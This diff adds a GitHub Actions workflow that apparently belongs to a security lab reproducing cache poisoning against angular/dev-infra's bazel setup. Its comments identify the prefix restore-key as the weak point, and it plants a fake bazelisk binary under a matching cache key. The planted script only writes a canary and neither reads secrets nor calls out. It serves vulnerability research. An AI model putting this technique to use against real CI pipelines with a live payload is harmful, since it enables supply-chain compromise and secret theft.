@@ -1,0 +1,41 @@
+# LAB stage 2a — cache "producer".
+# Models what the attacker's code (running with cache write access in the default-branch
+# benchmark job) can do: write an entry under the SAME key that angular/dev-infra's
+# bazel/setup action later restores. In the real chain the keys are:
+#   ~/.cache/bazelisk           key: bazel-version-Linux-<hash(**/.bazelversion)>   (exact)
+#   ~/.cache/bazel_repo_cache   key: bazel-cache-Linux-...  restore-keys: bazel-cache-Linux-  (prefix!)
+# The prefix restore-key is the weak point: any entry whose key starts with the prefix
+# can be served to the consumer.
+#
+# In this lab we model the bazelisk binary cache. The "poisoned binary" is a shell
+# script that just writes a canary; it NEVER reads a secret or calls out.
+name: cache-producer (LAB)
+
+on:
+  workflow_dispatch:
+  push:
+    branches: [attacker-cache]
+
+permissions:
+  contents: read
+  actions: write
+
+jobs:
+  poison:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Build a "poisoned bazelisk" (canary-only)
+        run: |
+          mkdir -p ~/.cache/bazelisk
+          cat > ~/.cache/bazelisk/bazelisk <<'EOF'
+          #!/usr/bin/env bash
+          echo "LAB_CANARY_7F3A poisoned-bazelisk ran in: ${GITHUB_WORKFLOW:-?} / ${GITHUB_JOB:-?}" | tee "$(pwd)/LAB-POISON-PROOF.txt"
+          EOF
+          chmod +x ~/.cache/bazelisk/bazelisk
+
+      # Write under the prefix the consumer's restore-keys will match.
+      - name: Save poisoned entry under bazel-cache prefix
+        uses: actions/cache/save@v4
+        with:
+          path: ~/.cache/bazelisk
+          key: bazel-cache-Linux-POISON-${{ github.run_id }}
